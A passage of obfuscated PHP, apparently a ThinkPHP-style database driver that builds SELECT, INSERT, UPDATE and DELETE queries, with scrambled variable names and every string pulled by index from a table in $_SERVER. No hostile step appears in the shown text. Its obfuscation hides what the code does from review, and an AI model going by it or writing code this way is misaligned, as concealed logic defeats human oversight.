$½ö¡”’[$üßú¹í[180]], $üßú¹í[891] => isset($½ö¡”’[$üßú¹í[600]]) ? $½ö¡”’[$üßú¹í[600]] : $üßú¹í[12], $üßú¹í[892] => isset($½ö¡”’[$üßú¹í[990]]) ? $½ö¡”’[$üßú¹í[990]] : $üßú¹í[12], $üßú¹í[889] => isset($½ö¡”’[$üßú¹í[181]]) ? $½ö¡”’[$üßú¹í[181]] : $üßú¹í[12], $üßú¹í[890] => isset($½ö¡”’[$üßú¹í[182]]) ? $½ö¡”’[$üßú¹í[182]] : $üßú¹í[12], $üßú¹í[21] => isset($½ö¡”’[$üßú¹í[84]]) ? substr($½ö¡”’[$üßú¹í[84]], 1) : $üßú¹í[12]); } else { preg_match($üßú¹í[991], trim($Î¨ÌºÆ), $˜«­ä); $¦Âıˆ·ñ = array($üßú¹í[966] => $˜«­ä[1], $üßú¹í[891] => $˜«­ä[2], $üßú¹í[892] => $˜«­ä[3], $üßú¹í[889] => $˜«­ä[4], $üßú¹í[890] => $˜«­ä[5], $üßú¹í[21] => $˜«­ä[6]); } $¦Âıˆ·ñ[$üßú¹í[921]] = $üßú¹í[12]; return $¦Âıˆ·ñ; } protected function debug() { $Şú½æó =& $_SERVER[Ì¥ŞÒ°£]; $this->modelSql[$this->model] = $this->queryStr; $this->model = $Şú½æó[992]; if (think_config($Şú½æó[993])) { think_status($Şú½æó[994]); think_trace($this->queryStr . $Şú½æó[995] . think_status($Şú½æó[24], $Şú½æó[994], 6) . $Şú½æó[996], $Şú½æó[12], $Şú½æó[997]); } } protected function parseLock($İÑ¬ğÛÛ = false) { $Ö¯¢Ø¼ö =& $_SERVER[Ì¥ŞÒ°£]; if (!$İÑ¬ğÛÛ) { return $Ö¯¢Ø¼ö[12]; } if ($Ö¯¢Ø¼ö[923] == $this->dbType) { return $Ö¯¢Ø¼ö[998]; } return $Ö¯¢Ø¼ö[999]; } protected function parseSet($ŒÏœŸ‘õ) { $öê‹ËÒ =& $_SERVER[Ì¥ŞÒ°£]; foreach ($ŒÏœŸ‘õ as $¶¬‰Ì§× => $Œ­åĞ†Í) { if (is_array($Œ­åĞ†Í) && $öê‹ËÒ[297] == $Œ­åĞ†Í[0]) { $š‘·ìˆ[] = $this->parseKey($¶¬‰Ì§×) . $öê‹ËÒ[887] . $Œ­åĞ†Í[1]; } elseif (is_scalar($Œ­åĞ†Í) || is_null($Œ­åĞ†Í)) { $š‘·ìˆ[] = $this->parseKey($¶¬‰Ì§×) . $öê‹ËÒ[887] . $this->parseValue($Œ­åĞ†Í); } } return $öê‹ËÒ[1000] . implode($öê‹ËÒ[50], $š‘·ìˆ); } protected function bindParam($ĞÅ‡©¦€, $´öÏÕ¢ß) { $this->bind[$_SERVER[Ì¥ŞÒ°£][4] . $ĞÅ‡©¦€] = $´öÏÕ¢ß; } protected function parseBind($¯µŸÅµÌ) { $¯µŸÅµÌ = array_merge($this->bind, $¯µŸÅµÌ); $this->bind = array(); return $¯µŸÅµÌ; } function parseKey(&$ÓŠÖ¡Îê, $…¨ÒˆƒÉ = true) { if ($…¨ÒˆƒÉ) { $ÓŠÖ¡Îê = $this->parseKeyCheck($ÓŠÖ¡Îê); } return $ÓŠÖ¡Îê; } function parseKeyCheck($ÍåœÅûß) { $¢ÏäåëÎ =& $_SERVER[Ì¥ŞÒ°£]; $ÍåœÅûß = trim($ÍåœÅûß); if (!preg_match($¢ÏäåëÎ[1001], $ÍåœÅûß)) { think_exception($¢ÏäåëÎ[1002] . $ÍåœÅûß); } return $ÍåœÅûß; } protected function parseValue($Ş–„ºÌ¸) { $òÒÃÚ‚ß =& $_SERVER[Ì¥ŞÒ°£]; if (is_string($Ş–„ºÌ¸)) { $Ş–„ºÌ¸ = $òÒÃÚ‚ß[962] . $this->escapeString($Ş–„ºÌ¸) . $òÒÃÚ‚ß[962]; } elseif (isset($Ş–„ºÌ¸[0]) && is_string($Ş–„ºÌ¸[0]) && strtolower($Ş–„ºÌ¸[0]) == $òÒÃÚ‚ß[297]) { $Ş–„ºÌ¸ = $this->escapeString($Ş–„ºÌ¸[1]); } elseif (is_array($Ş–„ºÌ¸)) { $Ş–„ºÌ¸ = array_map(array($this, $òÒÃÚ‚ß[963]), $Ş–„ºÌ¸); } elseif (is_bool($Ş–„ºÌ¸)) { $Ş–„ºÌ¸ = $Ş–„ºÌ¸ ? $òÒÃÚ‚ß[88] : $òÒÃÚ‚ß[197]; } elseif (is_null($Ş–„ºÌ¸)) { $Ş–„ºÌ¸ = $òÒÃÚ‚ß[103]; } return $Ş–„ºÌ¸; } protected function parseField($äåÀˆ÷¼) { $ñ”èµÄÖ =& $_SERVER[Ì¥ŞÒ°£]; if (is_string($äåÀˆ÷¼) && strpos($äåÀˆ÷¼, $ñ”èµÄÖ[50])) { $äåÀˆ÷¼ = explode($ñ”èµÄÖ[50], $äåÀˆ÷¼); } if (is_array($äåÀˆ÷¼)) { $â¸ğÆßÊ = array(); foreach ($äåÀˆ÷¼ as $†š±óãÖ => $…êËƒ×) { if (!is_numeric($†š±óãÖ)) { $â¸ğÆßÊ[] = $this->parseKey($†š±óãÖ, !1) . $ñ”èµÄÖ[1003] . $this->parseKey($…êËƒ×); } else { $â¸ğÆßÊ[] = $this->parseKey($…êËƒ×); } } $†­„™ï = implode($ñ”èµÄÖ[50], $â¸ğÆßÊ); } elseif (is_string($äåÀˆ÷¼) && !empty($äåÀˆ÷¼)) { $†­„™ï = $äåÀˆ÷¼; } else { $†­„™ï = $ñ”èµÄÖ[188]; } return $†­„™ï; } protected function parseTable($¯Ë‘å÷ß) { $Ä¢â÷ßş =& $_SERVER[Ì¥ŞÒ°£]; if (is_array($¯Ë‘å÷ß)) { $°İĞˆ¨Ø = array(); foreach ($¯Ë‘å÷ß as $üÈÇ£Ç÷ => $Œ†˜²è) { if (!is_numeric($üÈÇ£Ç÷)) { $°İĞˆ¨Ø[] = $this->parseKey($üÈÇ£Ç÷) . $Ä¢â÷ßş[53] . $this->parseKey($Œ†˜²è); } else { $°İĞˆ¨Ø[] = $this->parseKey($üÈÇ£Ç÷); } } $¯Ë‘å÷ß = $°İĞˆ¨Ø; } elseif (is_string($¯Ë‘å÷ß)) { if (strstr($¯Ë‘å÷ß, $Ä¢â÷ßş[53])) { return $¯Ë‘å÷ß; } $¯Ë‘å÷ß = explode($Ä¢â÷ßş[50], $¯Ë‘å÷ß); array_walk($¯Ë‘å÷ß, array($this, $Ä¢â÷ßş[909])); } return $Ä¢â÷ßş[903] . trim(implode($Ä¢â÷ßş[1004], $¯Ë‘å÷ß), $Ä¢â÷ßş[385]) . $Ä¢â÷ßş[903]; } protected function parseWhere($ÆàÂÇ) { $«ŒÎñöí =& $_SERVER[Ì¥ŞÒ°£]; $Œ§¯ì— = $«ŒÎñöí[12]; if (is_string($ÆàÂÇ)) { $Œ§¯ì— = $ÆàÂÇ; } else { $ßäÏòŠğ = isset($ÆàÂÇ[$«ŒÎñöí[1005]]) ? strtoupper($ÆàÂÇ[$«ŒÎñöí[1005]]) : $«ŒÎñöí[12]; if (in_array($ßäÏòŠğ, array($«ŒÎñöí[1006], $«ŒÎñöí[1007], $«ŒÎñöí[1008]))) { $ßäÏòŠğ = $«ŒÎñöí[53] . $ßäÏòŠğ . $«ŒÎñöí[53]; unset($ÆàÂÇ[$«ŒÎñöí[1005]]); } else { $ßäÏòŠğ = $«ŒÎñöí[1009]; } foreach ($ÆàÂÇ as $ÑËò’Ş => $µóó É÷) { $Œ§¯ì— .= $«ŒÎñöí[277]; if (is_numeric($ÑËò’Ş)) { $ÑËò’Ş = $«ŒÎñöí[1010]; } if (0 === strpos($ÑËò’Ş, $«ŒÎñöí[11])) { $Œ§¯ì— .= $this->parseThinkWhere($ÑËò’Ş, $µóó É÷); } else { if (!preg_match($«ŒÎñöí[1011], trim($ÑËò’Ş))) { think_exception(think_lang($«ŒÎñöí[1012]) . $«ŒÎñöí[4] . $ÑËò’Ş); } $Ÿå•€îÎ = is_array($µóó É÷) && isset($µóó É÷[$«ŒÎñöí[1013]]); $ÑËò’Ş = trim($ÑËò’Ş); if (strpos($ÑËò’Ş, $«ŒÎñöí[283])) { $ûù¬ú£ = explode($«ŒÎñöí[283], $ÑËò’Ş); $ÁùÛÁÒŸ = array(); foreach ($ûù¬ú£ as $ŸÇÍ³®š => $›§°±ÁĞ) { $¢Åì¯Ç = $Ÿå•€îÎ ? $µóó É÷[$ŸÇÍ³®š] : $µóó É÷; $ÁùÛÁÒŸ[] = $«ŒÎñöí[260] . $this->parseWhereItem($this->parseKey($›§°±ÁĞ), $¢Åì¯Ç) . $«ŒÎñöí[908]; } $Œ§¯ì— .= implode($«ŒÎñöí[1014], $ÁùÛÁÒŸ); } elseif (strpos($ÑËò’Ş, $«ŒÎñöí[284])) { $ûù¬ú£ = explode($«ŒÎñöí[284], $ÑËò’Ş); $ÁùÛÁÒŸ = array(); foreach ($ûù¬ú£ as $ŸÇÍ³®š => $›§°±ÁĞ) { $¢Åì¯Ç = $Ÿå•€îÎ ? $µóó É÷[$ŸÇÍ³®š] : $µóó É÷; $ÁùÛÁÒŸ[] = $«ŒÎñöí[260] . $this->parseWhereItem($this->parseKey($›§°±ÁĞ), $¢Åì¯Ç) . $«ŒÎñöí[908]; } $Œ§¯ì— .= implode($«ŒÎñöí[1009], $ÁùÛÁÒŸ); } else { $Œ§¯ì— .= $this->parseWhereItem($this->parseKey($ÑËò’Ş), $µóó É÷); } } $Œ§¯ì— .= $«ŒÎñöí[278] . $ßäÏòŠğ; } $Œ§¯ì— = substr($Œ§¯ì—, 0, -strlen($ßäÏòŠğ)); } return empty($Œ§¯ì—) ? $«ŒÎñöí[12] : $«ŒÎñöí[1015] . $Œ§¯ì—; } protected function parseWhereItem($Òš¾à•”, $¿ÙéÁ¾ğ) { $²ËÄ½í¢ =& $_SERVER[Ì¥ŞÒ°£]; $ûÇÑ«šÑ = $²ËÄ½í¢[12]; if (is_array($¿ÙéÁ¾ğ)) { if (is_string($¿ÙéÁ¾ğ[0])) { $æëØå„ = strtolower($¿ÙéÁ¾ğ[0]); if (in_array($¿ÙéÁ¾ğ[0], array($²ËÄ½í¢[887], $²ËÄ½í¢[1016], $²ËÄ½í¢[1017], $²ËÄ½í¢[1018], $²ËÄ½í¢[1019], $²ËÄ½í¢[1020]))) { $ûÇÑ«šÑ .= $Òš¾à•” . $²ËÄ½í¢[53] . $¿ÙéÁ¾ğ[0] . $²ËÄ½í¢[53] . $this->parseValue($¿ÙéÁ¾ğ[1]); } elseif (preg_match($²ËÄ½í¢[1021], $¿ÙéÁ¾ğ[0])) { $ûÇÑ«šÑ .= $Òš¾à•” . $²ËÄ½í¢[53] . $this->exp[$æëØå„] . $²ËÄ½í¢[53] . $this->parseValue($¿ÙéÁ¾ğ[1]); } elseif (preg_match($²ËÄ½í¢[1022], $¿ÙéÁ¾ğ[0])) { if (is_array($¿ÙéÁ¾ğ[1])) { $êŞ’¥á¡ = isset($¿ÙéÁ¾ğ[2]) ? strtoupper($¿ÙéÁ¾ğ[2]) : $²ËÄ½í¢[1007]; if (in_array($êŞ’¥á¡, array($²ËÄ½í¢[1006], $²ËÄ½í¢[1007], $²ËÄ½í¢[1008]))) { $ÚáÚœˆÔ = array(); foreach ($¿ÙéÁ¾ğ[1] as $²¬ëèö„) { $ÚáÚœˆÔ[] = $Òš¾à•” . $²ËÄ½í¢[53] . $this->exp[$æëØå„] . $²ËÄ½í¢[53] . $this->parseValue($²¬ëèö„); } $ûÇÑ«šÑ .= $²ËÄ½í¢[260] . implode($²ËÄ½í¢[53] . $êŞ’¥á¡ . $²ËÄ½í¢[53], $ÚáÚœˆÔ) . $²ËÄ½í¢[908]; } } else { $ûÇÑ«šÑ .= $Òš¾à•” . $²ËÄ½í¢[53] . $this->exp[$æëØå„] . $²ËÄ½í¢[53] . $this->parseValue($¿ÙéÁ¾ğ[1]); } } elseif ($²ËÄ½í¢[297] == $æëØå„) { $ûÇÑ«šÑ .= $²ËÄ½í¢[906] . $Òš¾à•” . $²ËÄ½í¢[53] . $¿ÙéÁ¾ğ[1] . $²ËÄ½í¢[1023]; } elseif (preg_match($²ËÄ½í¢[1024], $¿ÙéÁ¾ğ[0])) { $ûÇÑ«šÑ .= $¿ÙéÁ¾ğ[0]; } elseif (preg_match($²ËÄ½í¢[1025], $¿ÙéÁ¾ğ[0])) { if (isset($¿ÙéÁ¾ğ[2]) && $²ËÄ½í¢[297] == $¿ÙéÁ¾ğ[2]) { $ûÇÑ«šÑ .= $Òš¾à•” . $²ËÄ½í¢[53] . $this->exp[$æëØå„] . $²ËÄ½í¢[53] . $¿ÙéÁ¾ğ[1]; } else { if (is_string($¿ÙéÁ¾ğ[1])) { $¿ÙéÁ¾ğ[1] = explode($²ËÄ½í¢[50], $¿ÙéÁ¾ğ[1]); } $ÔúÅîç = implode($²ËÄ½í¢[50], $this->parseValue($¿ÙéÁ¾ğ[1])); $ûÇÑ«šÑ .= $Òš¾à•” . $²ËÄ½í¢[53] . $this->exp[$æëØå„] . $²ËÄ½í¢[906] . $ÔúÅîç . $²ËÄ½í¢[908]; } } elseif (preg_match($²ËÄ½í¢[1026], $¿ÙéÁ¾ğ[0])) { $²ØìíŸÔ = is_string($¿ÙéÁ¾ğ[1]) ? explode($²ËÄ½í¢[50], $¿ÙéÁ¾ğ[1]) : $¿ÙéÁ¾ğ[1]; $ûÇÑ«šÑ .= $²ËÄ½í¢[906] . $Òš¾à•” . $²ËÄ½í¢[53] . $this->exp[$æëØå„] . $²ËÄ½í¢[53] . $this->parseValue($²ØìíŸÔ[0]) . $²ËÄ½í¢[1009] . $this->parseValue($²ØìíŸÔ[1]) . $²ËÄ½í¢[278]; } else { think_exception(think_lang($²ËÄ½í¢[1012]) . $²ËÄ½í¢[4] . $¿ÙéÁ¾ğ[0]); } } else { $ä×ğËœ­ = count($¿ÙéÁ¾ğ); $ÛŞ½Ñ³ß = $²ËÄ½í¢[12]; if (is_string($¿ÙéÁ¾ğ[$ä×ğËœ­ - 1])) { $ÛŞ½Ñ³ß = isset($¿ÙéÁ¾ğ[$ä×ğËœ­ - 1]) ? strtoupper($¿ÙéÁ¾ğ[$ä×ğËœ­ - 1]) : $²ËÄ½í¢[12]; if (in_array($ÛŞ½Ñ³ß, array($²ËÄ½í¢[1006], $²ËÄ½í¢[1007], $²ËÄ½í¢[1008]))) { $ä×ğËœ­ = $ä×ğËœ­ - 1; } } else { $ÛŞ½Ñ³ß = $²ËÄ½í¢[1006]; } for ($êßå’˜ô = 0; $êßå’˜ô < $ä×ğËœ­; $êßå’˜ô++) { $²ØìíŸÔ = is_array($¿ÙéÁ¾ğ[$êßå’˜ô]) ? $¿ÙéÁ¾ğ[$êßå’˜ô][1] : $¿ÙéÁ¾ğ[$êßå’˜ô]; if ($²ËÄ½í¢[297] == strtolower($¿ÙéÁ¾ğ[$êßå’˜ô][0])) { $ûÇÑ«šÑ .= $²ËÄ½í¢[260] . $Òš¾à•” . $²ËÄ½í¢[53] . $²ØìíŸÔ . $²ËÄ½í¢[1023] . $ÛŞ½Ñ³ß . $²ËÄ½í¢[53]; } else { $³›­ˆŒë = is_array($¿ÙéÁ¾ğ[$êßå’˜ô]) ? $this->exp[strtolower($¿ÙéÁ¾ğ[$êßå’˜ô][0])] : $²ËÄ½í¢[887]; if (!$³›­ˆŒë && is_array($¿ÙéÁ¾ğ[$êßå’˜ô]) && in_array($¿ÙéÁ¾ğ[$êßå’˜ô][0], array($²ËÄ½í¢[887], $²ËÄ½í¢[1016], $²ËÄ½í¢[1017], $²ËÄ½í¢[1018], $²ËÄ½í¢[1019], $²ËÄ½í¢[1020]))) { $³›­ˆŒë = $¿ÙéÁ¾ğ[$êßå’˜ô][0]; } $ûÇÑ«šÑ .= $²ËÄ½í¢[260] . $Òš¾à•” . $²ËÄ½í¢[53] . $³›­ˆŒë . $²ËÄ½í¢[53] . $this->parseValue($²ØìíŸÔ) . $²ËÄ½í¢[1023] . $ÛŞ½Ñ³ß . $²ËÄ½í¢[53]; } } $ûÇÑ«šÑ = substr($ûÇÑ«šÑ, 0, -4); } } else { $ûÇÑ«šÑ .= $Òš¾à•” . $²ËÄ½í¢[1027] . $this->parseValue($¿ÙéÁ¾ğ); } return $ûÇÑ«šÑ; } protected function parseThinkWhere($€Í¢¿†¹, $õ§õõ²Ó) { $Ñ¬ÕÖë =& $_SERVER[Ì¥ŞÒ°£]; $ª±‚úİÌ = $Ñ¬ÕÖë[12]; switch ($€Í¢¿†¹) { case $Ñ¬ÕÖë[352]: $ª±‚úİÌ = $õ§õõ²Ó; break; case $Ñ¬ÕÖë[1010]: $ª±‚úİÌ = is_string($õ§õõ²Ó) ? $õ§õõ²Ó : substr($this->parseWhere($õ§õõ²Ó), 6); break; case $Ñ¬ÕÖë[1028]: parse_str($õ§õõ²Ó, $šĞ°µş®); if (isset($šĞ°µş®[$Ñ¬ÕÖë[1005]])) { $×ãıÊšÁ = $Ñ¬ÕÖë[53] . strtoupper($šĞ°µş®[$Ñ¬ÕÖë[1005]]) . $Ñ¬ÕÖë[53]; unset($šĞ°µş®[$Ñ¬ÕÖë[1005]]); } else { $×ãıÊšÁ = $Ñ¬ÕÖë[1009]; } $¤ë™Åã‰ = array(); foreach ($šĞ°µş® as $±…óÕ¬‰ => $ì¹«¹½±) { $¤ë™Åã‰[] = $this->parseKey($±…óÕ¬‰) . $Ñ¬ÕÖë[1027] . $this->parseValue($ì¹«¹½±); } $ª±‚úİÌ = implode($×ãıÊšÁ, $¤ë™Åã‰); break; } return $ª±‚úİÌ; } protected function parseLimit($Ï„Èéäë) { $ó¼Ê’Ú¨ =& $_SERVER[Ì¥ŞÒ°£]; return !empty($Ï„Èéäë) ? $ó¼Ê’Ú¨[51] . $Ï„Èéäë . $ó¼Ê’Ú¨[53] : $ó¼Ê’Ú¨[12]; } protected function parseJoin($åÏëâÅ) { $¤²…‚ú =& $_SERVER[Ì¥ŞÒ°£]; $Ç¿¯€• = $¤²…‚ú[12]; if (!empty($åÏëâÅ)) { if (is_array($åÏëâÅ)) { foreach ($åÏëâÅ as $«ÍÒ¶³ˆ => $ûâ¬Ä–) { if (!1 !== stripos($ûâ¬Ä–, $¤²…‚ú[1029])) { $Ç¿¯€• .= $¤²…‚ú[53] . $ûâ¬Ä–; } else { $Ç¿¯€• .= $¤²…‚ú[1030] . $ûâ¬Ä–; } } } else { $Ç¿¯€• .= $¤²…‚ú[1030] . $åÏëâÅ; } } $Ç¿¯€• = preg_replace($¤²…‚ú[1031], think_config($¤²…‚ú[935]) . $¤²…‚ú[1032], $Ç¿¯€•); return $Ç¿¯€•; } protected function parseOrder($¸ ±¨éÆ) { $ŸˆÁš³ =& $_SERVER[Ì¥ŞÒ°£]; if (is_array($¸ ±¨éÆ)) { $‘úµÏÄ = array(); foreach ($¸ ±¨éÆ as $Õ¿ıàò => $¨à²»Ùô) { if (is_numeric($Õ¿ıàò)) { $‘úµÏÄ[] = $this->parseKey($¨à²»Ùô); } else { $¨à²»Ùô = in_array(strtoupper(trim($¨à²»Ùô)), array($ŸˆÁš³[1033], $ŸˆÁš³[1034])) ? $ŸˆÁš³[53] . $¨à²»Ùô : $ŸˆÁš³[12]; if (preg_match($ŸˆÁš³[1035], $Õ¿ıàò)) { $‘úµÏÄ[] = $this->parseKey($Õ¿ıàò) . $¨à²»Ùô; } else { think_exception($ŸˆÁš³[1036] . $Õ¿ıàò); } } } $¸ ±¨éÆ = implode($ŸˆÁš³[50], $‘úµÏÄ); } return !empty($¸ ±¨éÆ) ? $ŸˆÁš³[1037] . $¸ ±¨éÆ : $ŸˆÁš³[12]; } protected function parseGroup($ç²¼Ê­‚) { $•°·ïÎÄ =& $_SERVER[Ì¥ŞÒ°£]; return !empty($ç²¼Ê­‚) ? $•°·ïÎÄ[1038] . $ç²¼Ê­‚ : $•°·ïÎÄ[12]; } protected function parseHaving($¢ıÁ¶ªï) { $¤‚¶±òü =& $_SERVER[Ì¥ŞÒ°£]; return !empty($¢ıÁ¶ªï) ? $¤‚¶±òü[1039] . $¢ıÁ¶ªï : $¤‚¶±òü[12]; } protected function parseComment($›¡Üïú) { $‡ş‘¶È‹ =& $_SERVER[Ì¥ŞÒ°£]; return !empty($›¡Üïú) ? $‡ş‘¶È‹[1040] . $›¡Üïú . $‡ş‘¶È‹[1041] : $‡ş‘¶È‹[12]; } protected function parseDistinct($´™¥ñ­À) { $¶ûµ©ê =& $_SERVER[Ì¥ŞÒ°£]; return !empty($´™¥ñ­À) ? $¶ûµ©ê[1042] : $¶ûµ©ê[12]; } protected function parseUnion($ëö–¾Ÿ¢) { $÷š©¼±Ò =& $_SERVER[Ì¥ŞÒ°£]; if (empty($ëö–¾Ÿ¢)) { return $÷š©¼±Ò[12]; } if (isset($ëö–¾Ÿ¢[$÷š©¼±Ò[348]])) { $ëã×áòø = $÷š©¼±Ò[1043]; unset($ëö–¾Ÿ¢[$÷š©¼±Ò[348]]); } else { $ëã×áòø = $÷š©¼±Ò[1044]; } foreach ($ëö–¾Ÿ¢ as $íîı…´±) { $ÙÎÑ¯ğ[] = $ëã×áòø . (is_array($íîı…´±) ? $this->buildSelectSql($íîı…´±) : $íîı…´±); } return implode($÷š©¼±Ò[53], $ÙÎÑ¯ğ); } public function insert($÷è‘Šú, $–úÁæöÑ = array(), $Ï²ñ™ = false) { $ëã°Õ =& $_SERVER[Ì¥ŞÒ°£]; $Å‡¨²¨ = $­õ¢ïì¿ = array(); $this->model = $–úÁæöÑ[$ëã°Õ[281]]; foreach ($÷è‘Šú as $şœ›±¿ => $Ø¿íî­¢) { if (is_array($Ø¿íî­¢) && $ëã°Õ[297] == $Ø¿íî­¢[0]) { $­õ¢ïì¿[] = $this->parseKey($şœ›±¿); $Å‡¨²¨[] = $Ø¿íî­¢[1]; } elseif (is_scalar($Ø¿íî­¢) || is_null($Ø¿íî­¢)) { $­õ¢ïì¿[] = $this->parseKey($şœ›±¿); $Å‡¨²¨[] = $this->parseValue($Ø¿íî­¢); } } $„£ œ© = ($Ï²ñ™ ? $ëã°Õ[910] : $ëã°Õ[911]) . $ëã°Õ[912] . $this->parseTable($–úÁæöÑ[$ëã°Õ[279]]) . $ëã°Õ[906] . implode($ëã°Õ[50], $­õ¢ïì¿) . $ëã°Õ[907] . implode($ëã°Õ[50], $Å‡¨²¨) . $ëã°Õ[908]; $„£ œ© .= $this->parseLock(isset($–úÁæöÑ[$ëã°Õ[845]]) ? $–úÁæöÑ[$ëã°Õ[845]] : !1); $„£ œ© .= $this->parseComment(!empty($–úÁæöÑ[$ëã°Õ[354]]) ? $–úÁæöÑ[$ëã°Õ[354]] : $ëã°Õ[12]); return $this->execute($„£ œ©, $this->parseBind(!empty($–úÁæöÑ[$ëã°Õ[285]]) ? $–úÁæöÑ[$ëã°Õ[285]] : array())); } public function selectInsert($¤ÎÌ“¨í, $”şÉÛÕá, $«¨óòã¶ = array()) { $Õªªì³å =& $_SERVER[Ì¥ŞÒ°£]; $this->model = $«¨óòã¶[$Õªªì³å[281]]; if (is_string($¤ÎÌ“¨í)) { $¤ÎÌ“¨í = explode($Õªªì³å[50], $¤ÎÌ“¨í); } array_walk($¤ÎÌ“¨í, array($this, $Õªªì³å[909])); $£¾‘èÒ = $Õªªì³å[1045] . $this->parseTable($”şÉÛÕá) . $Õªªì³å[906] . implode($Õªªì³å[50], $¤ÎÌ“¨í) . $Õªªì³å[1023]; $£¾‘èÒ .= $this->buildSelectSql($«¨óòã¶); return $this->execute($£¾‘èÒ, $this->parseBind(!empty($«¨óòã¶[$Õªªì³å[285]]) ? $«¨óòã¶[$Õªªì³å[285]] : array())); } public function update($´ëñ›Å‰, $§İÏËç¥) { $¯úúßä =& $_SERVER[Ì¥ŞÒ°£]; $this->model = $§İÏËç¥[$¯úúßä[281]]; $Šƒªëš = $¯úúßä[1046] . $this->parseTable($§İÏËç¥[$¯úúßä[279]]) . $this->parseSet($´ëñ›Å‰) . $this->parseWhere(!empty($§İÏËç¥[$¯úúßä[275]]) ? $§İÏËç¥[$¯úúßä[275]] : $¯úúßä[12]) . $this->parseOrder(!empty($§İÏËç¥[$¯úúßä[365]]) ? $§İÏËç¥[$¯úúßä[365]] : $¯úúßä[12]) . $this->parseLimit(!empty($§İÏËç¥[$¯úúßä[292]]) ? $§İÏËç¥[$¯úúßä[292]] : $¯úúßä[12]) . $this->parseLock(isset($§İÏËç¥[$¯úúßä[845]]) ? $§İÏËç¥[$¯úúßä[845]] : !1) . $this->parseComment(!empty($§İÏËç¥[$¯úúßä[354]]) ? $§İÏËç¥[$¯úúßä[354]] : $¯úúßä[12]); return $this->execute($Šƒªëš, $this->parseBind(!empty($§İÏËç¥[$¯úúßä[285]]) ? $§İÏËç¥[$¯úúßä[285]] : array())); } public function delete($ÜÇó¶ş = array()) { $¯¿‹úàğ =& $_SERVER[Ì¥ŞÒ°£]; $this->model = $ÜÇó¶ş[$¯¿‹úàğ[281]]; $¿ü™…£Ì = $¯¿‹úàğ[1047] . $this->parseTable($ÜÇó¶ş[$¯¿‹úàğ[279]]) . $this->parseWhere(!empty($ÜÇó¶ş[$¯¿‹úàğ[275]]) ? $ÜÇó¶ş[$¯¿‹úàğ[275]] : $¯¿‹úàğ[12]) . $this->parseOrder(!empty($ÜÇó¶ş[$¯¿‹úàğ[365]]) ? $ÜÇó¶ş[$¯¿‹úàğ[365]] : $¯¿‹úàğ[12]) . $this->parseLimit(!empty($ÜÇó¶ş[$¯¿‹úàğ[292]]) ? $ÜÇó¶ş[$¯¿‹úàğ[292]] : $¯¿‹úàğ[12]) . $this->parseLock(isset($ÜÇó¶ş[$¯¿‹úàğ[845]]) ? $ÜÇó¶ş[$¯¿‹úàğ[845]] : !1) . $this->parseComment(!empty($ÜÇó¶ş[$¯¿‹úàğ[354]]) ? $ÜÇó¶ş[$¯¿‹úàğ[354]] : $¯¿‹úàğ[12]); return $this->execute($¿ü™…£Ì, $this->parseBind(!empty($ÜÇó¶ş[$¯¿‹úàğ[285]]) ? $ÜÇó¶ş[$¯¿‹úàğ[285]] : array())); } public function select($Ğ ‘µÅÖ = array()) { $òÅ–ä² =& $_SERVER[Ì¥ŞÒ°£]; $this->model = $Ğ ‘µÅÖ[$òÅ–ä²[281]]; $Êé°ƒ¶õ = $this->buildSelectSql($Ğ ‘µÅÖ); $¿³¬òšè = isset($Ğ ‘µÅÖ[$òÅ–ä²[349]]) ? $Ğ ‘µÅÖ[$òÅ–ä²[349]] : !1; if ($¿³¬òšè) { $‹¾æ¸Ÿˆ = is_string($¿³¬òšè[$òÅ–ä²[94]]) ? $¿³¬òšè[$òÅ–ä²[94]] : $òÅ–ä²[1048] . md5($Êé°ƒ¶õ); $¢Ì²ÀÔâ = think_cache($‹¾æ¸Ÿˆ, $òÅ–ä²[12], $¿³¬òšè); if (!1 !== $¢Ì²ÀÔâ) { return $¢Ì²ÀÔâ; } } $¡ùØšã = $this->query($Êé°ƒ¶õ, $this->parseBind(!empty($Ğ ‘µÅÖ[$òÅ–ä²[285]]) ? $Ğ ‘µÅÖ[$òÅ–ä²[285]] : array())); if ($¿³¬òšè && !1 !== $¡ùØšã) { think_cache($‹¾æ¸Ÿˆ, $¡ùØšã, $¿³¬òšè); } return $¡ùØšã; } public function buildSelectSql($¢ìè›Âî = array()) { $·ç×÷ =& $_SERVER[Ì¥ŞÒ°£]; if (isset($¢ìè›Âî[$·ç×÷[353]])) { if (strpos($¢ìè›Âî[$·ç×÷[353]], $·ç×÷[50])) { list($Äİà—”Š, $µÚİÛï) = explode($·ç×÷[50], $¢ìè›Âî[$·ç×÷[353]]); } else { $Äİà—”Š = $¢ìè›Âî[$·ç×÷[353]]; } $Äİà—”Š = $Äİà—”Š ? $Äİà—”Š : 1; $µÚİÛï = isset($µÚİÛï) ? $µÚİÛï : (is_numeric($¢ìè›Âî[$·ç×÷[292]]) ? $¢ìè›Âî[$·ç×÷[292]] : 20); $…à£ˆÏ = $µÚİÛï * ((int) $Äİà—”Š - 1); $¢ìè›Âî[$·ç×÷[292]] = $…à£ˆÏ . $·ç×÷[50] . $µÚİÛï; } if (think_config($·ç×÷[1049])) { $åË€É™¬ = $·ç×÷[1050] . md5(serialize($¢ìè›Âî)); $ŒË®õŸ = think_cache($åË€É™¬); if ($ŒË®õŸ) { return $ŒË®õŸ; } } $«­ŞĞÛ = $this->parseSql($this->selectSql, $¢ìè›Âî); $«­ŞĞÛ .= $this->parseLock(isset($¢ìè›Âî[$·ç×÷[845]]) ? $¢ìè›Âî[$·ç×÷[845]] : !1); if (isset($åË€É™¬)) { think_cache($åË€É™¬, $«­ŞĞÛ); } return $«­ŞĞÛ; } public function parseSql($¯€ØàĞÂ, $Ú¤À„æ½ = array()) { $Ü½„û‹Ğ =& $_SERVER[Ì¥ŞÒ°£]; $¯€ØàĞÂ = str_replace(array($Ü½„û‹Ğ[1051], $Ü½„û‹Ğ[1052], $Ü½„û‹Ğ[1053], $Ü½„û‹Ğ[1054], $Ü½„û‹Ğ[1055], $Ü½„û‹Ğ[1056], $Ü½„û‹Ğ[1057], $Ü½„û‹Ğ[1058], $Ü½„û‹Ğ[1059], $Ü½„û‹Ğ[1060], $Ü½„û‹Ğ[1061]), array($this->parseTable("{$Ú¤À„æ½[$Ü½„û‹Ğ[279]]}"), $this->parseDistinct(isset($Ú¤À„æ½[$Ü½„û‹Ğ[1062]]) ? $Ú¤À„æ½[$Ü½„û‹Ğ[1062]] : !1), $this->parseField(!empty($Ú¤À„æ½[$Ü½„û‹Ğ[273]]) ? $Ú¤À„æ½[$Ü½„û‹Ğ[273]] : $Ü½„û‹Ğ[188]), $this->parseJoin(!empty($Ú¤À„æ½[$Ü½„û‹Ğ[282]]) ? 